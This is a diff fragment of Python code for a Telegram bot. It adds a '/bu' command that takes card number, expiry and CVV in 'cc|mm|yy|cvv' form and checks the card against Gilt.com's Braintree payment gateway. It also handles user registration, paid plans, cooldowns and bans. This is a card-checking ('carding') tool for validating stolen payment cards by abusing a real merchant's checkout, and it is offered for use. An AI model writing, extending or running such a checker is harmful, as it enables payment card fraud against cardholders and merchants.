+                tokenization_result['token'],
+                tokenization_result['cardholder_name']
+            )
+
+            await client.aclose()
+
+            # Return formatted result
+            elapsed_time = time.time() - start_time
+            return await self.format_response(
+                cc, mes, ano, cvv, 
+                payment_result['status'], 
+                payment_result['message'], 
+                username, 
+                elapsed_time, 
+                user_data, 
+                bin_info
+            )
+
+        except httpx.TimeoutException:
+            logger.error("Request timeout")
+            if client:
+                await client.aclose()
+            return await self.format_response(cc, mes, ano, cvv, "ERROR", "Request timeout", username, time.time()-start_time, user_data, bin_info)
+        except httpx.ConnectError:
+            logger.error("Connection error")
+            if client:
+                await client.aclose()
+            return await self.format_response(cc, mes, ano, cvv, "ERROR", "Connection failed", username, time.time()-start_time, user_data, bin_info)
+        except Exception as e:
+            logger.error(f"Unexpected error: {str(e)}")
+            if client:
+                await client.aclose()
+            return await self.format_response(cc, mes, ano, cvv, "ERROR", f"System error: {str(e)[:80]}", username, time.time()-start_time, user_data, bin_info)
+
+# Command handler for /bu command
+@Client.on_message(filters.command(["bu", ".bu", "$bu"]))
+@auth_and_free_restricted
+async def handle_gilt_braintree_auth(client: Client, message: Message):
+    try:
+        user_id = message.from_user.id
+        username = message.from_user.username or str(user_id)
+
+        # Check if command is disabled
+        from BOT.helper.Admins import is_command_disabled, get_command_offline_message
+
+        command_text = message.text.split()[0]
+        command_name = command_text.lstrip('/.$')
+
+        if is_command_disabled(command_name):
+            await message.reply(get_command_offline_message(command_text))
+            return
+
+        if is_user_banned(user_id):
+            await message.reply("""<pre>⛔ User Banned</pre>
+━━━━━━━━━━━━━
+⟐ <b>Message</b>: You have been banned from using this bot.
+⟐ <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
+━━━━━━━━━━━━━""")
+            return
+
+        users = load_users()
+        user_id_str = str(user_id)
+        if user_id_str not in users:
+            await message.reply("""<pre>🔒 Registration Required</pre>
+━━━━━━━━━━━━━
+⟐ <b>Message</b>: You need to register first with /register
+⟐ <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
+━━━━━━━━━━━━━""")
+            return
+
+        user_data = users[user_id_str]
+        user_plan = user_data.get("plan", {})
+        plan_name = user_plan.get("plan", "Free")
+
+        # Check cooldown
+        can_use, wait_time = check_cooldown(user_id, "bu")
+        if not can_use:
+            await message.reply(f"""<pre>⏳ Cooldown Active</pre>
+━━━━━━━━━━━━━
+⟐ <b>Message</b>: Please wait {wait_time:.1f} seconds before using this command again.
+⟐ <b>Your Plan:</b> <code>{plan_name}</code>
+⟐ <b>Anti-Spam:</b> <code>{user_plan.get('antispam', 15)}s</code>
+━━━━━━━━━━━━━""")
+            return
+
+        # NO CREDIT DEDUCTION - This gate is FREE
+        # (Removed credit deduction as per stauth.py example)
+
+        args = message.text.split()
+        if len(args) < 2:
+            await message.reply("""<pre>#WAYNE ─[BRAINTREE AUTH]─</pre>
+━━━━━━━━━━━━━
+⟐ <b>Command</b>: <code>/bu</code> or <code>.bu</code> or <code>$bu</code>
+⟐ <b>Usage</b>: <code>/bu cc|mm|yy|cvv</code>
+⟐ <b>Example</b>: <code>/bu 4111111111111111|12|2025|123</code>
+━━━━━━━━━━━━━
+<b>~ Note:</b> <code>Checks card via Gilt.com Braintree Auth gateway</code>""")
+            return
+
+        card_details = args[1].strip()
+
+        cc_parts = card_details.split('|')
+        if len(cc_parts) < 4:
+            await message.reply("""<pre>❌ Invalid Format</pre>
+━━━━━━━━━━━━━
+⟐ <b>Message</b>: Invalid card format.
+⟐ <b>Correct Format</b>: <code>cc|mm|yy|cvv</code>
+⟐ <b>Example</b>: <code>4111111111111111|12|2025|123</code>
+━━━━━━━━━━━━━""")
+            return
+
+        cc = cc_parts[0]
+        mes = cc_parts[1]
+        ano = cc_parts[2]
+        cvv = cc_parts[3]
+
+        checker = GiltBraintreeAuthChecker()
+        processing_msg = await message.reply(
+            checker.get_processing_message(cc, mes, ano, cvv, username, plan_name)
+        )
+
+        result = await checker.check_card(card_details, username, user_data)
+
+        await processing_msg.edit_text(result, disable_web_page_preview=True)
+
+    except Exception as e:
+        error_msg = str(e)[:150]
+        await message.reply(f"""<pre>❌ Command Error</pre>
+━━━━━━━━━━━━━
+⟐ <b>Message</b>: An error occurred while processing your request.
+⟐ <b>Error</b>: <code>{error_msg}</code>
+⟐ <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
+━━━━━━━━━━━━━""")
